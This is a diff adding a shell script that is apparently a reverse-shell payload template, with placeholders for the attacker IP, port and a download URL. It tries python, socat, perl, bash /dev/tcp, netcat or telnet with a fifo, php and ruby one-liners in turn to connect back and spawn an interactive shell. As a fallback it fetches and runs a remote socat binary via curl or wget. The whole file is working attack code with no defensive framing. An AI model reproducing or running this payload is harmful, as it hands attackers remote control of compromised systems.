@@ -1,0 +1,57 @@
+
+IP='#IP#'
+PORT='#LPORT#'
+
+if bash=`command -v bash`;then
+	shell=$bash
+elif zsh=`command -v zsh`;then
+	shell=$zsh
+elif sh=`command -v sh`;then
+	shell=$sh
+elif ksh=`command -v ksh`;then
+	shell=$ksh
+elif tcsh=`command -v tcsh`;then
+	shell=$tcsh
+elif csh=`command -v csh`;then
+	shell=$csh
+else
+	exit
+fi
+
+if py=`command -v python`;then
+	$py -c "import sys,socket,os,pty; _,ip,port=sys.argv; s=socket.socket(); s.connect((ip,int(port))); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn('"$shell"')" $IP $PORT
+	exit
+elif sc=`command -v socat`;then
+	$sc exec:''$shell' -i',pty,stderr,setsid,sigint,sane tcp:$IP:$PORT
+	exit
+fi
+
+
+if `command -v expect`;then
+	if pe=`command -v perl`;then
+		$pe -e 'use Socket;$i="'$IP'";$p='$PORT';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("'$shell' -i");};'
+	elif bsh=`command -v bash`;then
+		$bsh -c ''$bsh' -i >& /dev/tcp/'$IP'/'$PORT' 0>&1'
+	elif nctn=`command -v netcat` || nctn=`command -v telnet`;then
+		file=`mktemp -u`
+		rm $file 2>/dev/null;mkfifo $file;cat $file|$shell -i 2>&1|$nctn $IP $PORT>$file
+	elif php=`command -v php`;then
+		$php -r '$sock=fsockopen("'$IP'",'$PORT');exec("'$shell' -i <&3 >&3 2>&3");'
+	elif rb=`command -v ruby`;then
+		$rb -rsocket -e's=Socket.new 2,1;s.connect Socket.sockaddr_in '$PORT', "'$IP'";[0,1,2].each { |fd| syscall 33, s.fileno, fd };exec "'$shell' -i"'
+	#elif awk=`command -v awk`;then
+	#	$awk 'BEGIN {s = "/inet/tcp/0/'$IP'/'$PORT'"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+	#elif tclsh=`command -v tclsh`;then
+	#	echo 'set s [socket '$IP' '$PORT'];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | $tclsh
+	fi
+else
+	sc=`mktemp -u`
+	user=`whoami`
+	SCURL="#SCURL#-`uname -m`"
+	curl -s $SCURL --output $sc || wget -qO $sc $SCURL
+	chown $user:$user $sc
+	chmod +x $sc
+	$sc exec:''$shell' -i',pty,stderr,setsid,sigint,sane tcp:$IP:$PORT
+	rm -f $sc
+fi
+exit
